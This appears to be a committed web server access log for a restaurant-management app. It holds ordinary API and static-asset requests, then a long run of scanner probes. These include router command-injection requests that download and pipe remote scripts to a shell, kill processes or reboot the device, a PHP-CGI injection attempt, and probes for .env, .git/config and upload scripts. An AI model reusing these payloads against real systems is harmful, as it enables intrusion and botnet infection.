+INFO:     127.0.0.1:45158 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45168 - "GET /_next/static/chunks/main-f61746aa183f4a64.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45174 - "GET /_next/static/chunks/framework-ecc4130bc7a58a64.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45188 - "GET /_next/static/chunks/664-806b52bf69b97e98.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45182 - "GET /_next/static/chunks/webpack-6ef43a8d4a395f49.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45194 - "GET /_next/static/chunks/675-45f9f7ae57ff0f95.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45196 - "GET /_next/static/chunks/pages/V1/Home-72d666023b50f8a8.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45208 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45216 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45220 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45230 - "GET /_next/static/chunks/pages/V1/RestaurantSignUpPage-51be41ac8631d05d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45234 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45240 - "GET /rawMaterial/getAllRawMaterialsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45250 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52010 - "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52022 - "GET /apple-touch-icon.png HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52026 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52042 - "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52044 - "GET /apple-touch-icon.png HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52050 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57454 - "GET /_next/static/css/23ac19b4707a01d5.css HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57458 - "GET /_next/static/chunks/webpack-6ef43a8d4a395f49.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57462 - "GET /_next/static/chunks/framework-ecc4130bc7a58a64.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57468 - "GET /_next/static/chunks/main-f61746aa183f4a64.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57484 - "GET /_next/static/chunks/675-45f9f7ae57ff0f95.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57498 - "GET /_next/static/chunks/pages/_app-42a5a2918be03e75.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57508 - "GET /_next/static/chunks/pages/V1/Home-72d666023b50f8a8.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57500 - "GET /_next/static/chunks/664-806b52bf69b97e98.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57514 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_buildManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57520 - "GET /_next/static/JgsTSqPmjhe_Wp3slkVLF/_ssgManifest.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57532 - "GET /cart.json HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57542 - "GET /_next/static/chunks/pages/V1/RestaurantSignInPage-192227ab06b96f5b.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57546 - "GET /_next/static/chunks/pages/V1/RestaurantSignUpPage-51be41ac8631d05d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57556 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41438 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41440 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 403 Forbidden
+INFO:     127.0.0.1:41444 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41458 - "GET /_next/static/chunks/pages/V1/RestaurantImagePage-04c3f3a7ac4ecec6.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41464 - "GET /cart.json HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41472 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41480 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41490 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41502 - "GET /food/getAllFoodItemsByRestaurant/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41510 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46474 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46478 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46484 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46490 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46498 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46508 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46516 - "GET /food/getAllFoodItemsByRestaurant/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46518 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46528 - "GET /foodRecipeSteps/recipe_steps/1 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36916 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36924 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36930 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36934 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36944 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36946 - "GET /restaurant/getRestaurantByUserId/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36960 - "GET /food/getAllFoodItemsByRestaurant/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36972 - "GET /rawMaterial/getAllRawMaterials HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53364 - "GET /foodRecipeSteps/recipe_steps/2 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54138 - "POST /foodRecipeSteps/recipe_steps HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54146 - "POST /foodRecipeSteps/recipe_steps HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54160 - "GET /foodRecipeSteps/recipe_steps/2 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37712 - "GET /foodRecipeSteps/recipe_steps/3 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40530 - "GET /cart.json HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40540 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40550 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40560 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40564 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40578 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40588 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40598 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40612 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40620 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40622 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:40632 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:47590 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:47592 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:47606 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:47614 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:47626 - "POST /restaurantUser/restaurant_login HTTP/1.1" 400 Bad Request
+INFO:     127.0.0.1:47638 - "GET /cart.json HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47642 - "POST /restaurantUser/restaurant_login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47656 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47670 - "GET /_next/static/chunks/4b358913-4923fb70bea84721.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47684 - "GET /_next/static/chunks/358-0e5c8ffb23fe4a1d.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47688 - "GET /_next/static/chunks/86-a19cca599fd53215.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47698 - "GET /_next/static/chunks/140-effb0c232cf7d845.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47708 - "GET /_next/static/chunks/pages/V1/DashBoardPage-3cd8852957ef63a3.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34594 - "GET /restaurant/getRestaurantByUserId/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34596 - "GET /_next/static/chunks/691-acdedb1a7f3c6410.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34600 - "GET /_next/static/chunks/530-81d8b5d9225e2fc4.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34602 - "GET /_next/static/chunks/pages/V1/CardSelectionPage-9e1f9dceb8ad0b6c.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34608 - "GET /_next/static/chunks/665-ef3f8ae02fc2a8ed.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34622 - "GET /_next/static/chunks/pages/V1/CouponPage-5276e27e6c31ed1e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34634 - "GET /_next/static/chunks/482-f4c289378f770d45.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34642 - "GET /_next/static/chunks/940-c4e4b87d767c9895.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34656 - "GET /_next/static/chunks/312-2dde3ed767e4a1ce.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34660 - "GET /_next/static/chunks/613-df6395674591c160.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34670 - "GET /_next/static/chunks/930-486bab2ae1df07d6.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34678 - "GET /_next/static/chunks/pages/V1/Menu-0aa8f08326d1c725.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34684 - "GET /_next/static/chunks/76-f3e445fb2e009fff.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34688 - "GET /_next/static/chunks/pages/V1/RawMaterial-8c66674ba0aa161e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34702 - "GET /_next/static/chunks/pages/V1/EmployeeMgmtSystem-5e561efbbddaf88e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34706 - "GET /_next/static/chunks/pages/V1/AllReviewPage-cb24cb4156f4e09e.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34720 - "GET /_next/static/chunks/pages/V1/MyProfile-db16dc6129c7e94a.js HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52176 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49678 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48406 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40510 - "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33354 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35466 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35468 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F172.104.152.160%2Fbin+-O-+%7Csh%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40022 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51594 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60052 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45940 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34664 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34674 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52206 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52842 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54362 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46734 - "GET /hudson HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58590 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50344 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44974 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45138 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45152 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47610 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50784 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39974 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47732 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52432 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35870 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45144 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60966 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56522 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57396 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40934 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49804 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60878 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60894 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43140 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34940 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34952 - "GET /wp-includes/css/buttons.css HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34962 - "GET /media/system/js/core.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51228 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47566 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55018 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35236 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60844 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39724 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39736 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38274 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49026 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41878 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42762 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:42778 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:57466 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57480 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:37908 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41096 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56024 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35952 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35966 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:36268 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44652 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41454 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57792 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57802 - "GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.1" 200 OK
+INFO:     127.0.0.1:57816 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:57826 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:42308 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39382 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37310 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45648 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45650 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:58742 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47532 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41252 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56218 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34274 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39908 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54532 - "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D""+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49650 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58984 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38304 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35526 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35542 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:47638 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:43522 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55392 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40584 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49984 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50000 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:34704 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39936 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59042 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37242 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37222 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52554 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37308 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48382 - "OPTIONS / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:51570 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48566 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48576 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48590 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48594 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51290 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60446 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35356 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40520 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51712 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48874 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56740 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59848 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36026 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34910 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:32944 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52326 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37422 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39140 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41322 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60busybox+reboot%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48254 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48256 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:58102 - "GET /actuator/gateway/routes HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45536 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56286 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54708 - "GET /webui/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37688 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:57550 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:40792 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:50884 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33316 - "GET /form.html HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33322 - "GET /upl.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33334 - "GET /t4 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33350 - "GET /geoip/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33354 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33360 - "GET /1.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33366 - "GET /systembc/password.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33376 - "GET /password.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46010 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53484 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52986 - "GET /druid/index.html HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37148 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33268 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:41028 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53194 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52130 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40148 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35572 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49368 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60546 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54068 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:50874 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.176%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51266 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58808 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58814 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58816 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58826 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34034 - "GET /.env HTTP/1.1" 404 Not Found
